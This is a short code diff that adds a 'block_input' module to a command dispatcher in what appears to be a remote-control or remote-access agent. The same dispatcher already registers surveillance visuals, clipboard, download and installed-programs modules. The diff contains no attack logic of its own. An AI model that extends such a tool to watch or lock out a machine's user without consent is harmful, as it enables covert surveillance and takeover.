@@ -17,6 +17,7 @@ from .modules.system.installed_programs import Programs
 from .modules.surveillance.visual import Visuals
 from .modules.input_output.clipboard import Clipboard
 from .modules.commands import Command, CommandArgs, command_to_module_map, ICommandModule, CommandResult
+from .modules.input_output.block_input import BlockInput
 
 filesystem_handler = FileSystem()
 download = Download()
@@ -36,6 +37,7 @@ programs = Programs()
 clipboard = Clipboard()
 window = Window()
 visuals = Visuals()
+block_input = BlockInput()
 
 def module_factory(module_name: str) -> ICommandModule:
     module_name_map = {
@@ -56,7 +58,8 @@ def module_factory(module_name: str) -> ICommandModule:
         "programs" : programs,
         "clipboard" : clipboard,
         "window" : window,
-        "visuals" : visuals
+        "visuals" : visuals,
+        "block_input" : block_input
     }
     if module_name not in module_name_map:
         raise ValueError("Module Not found")
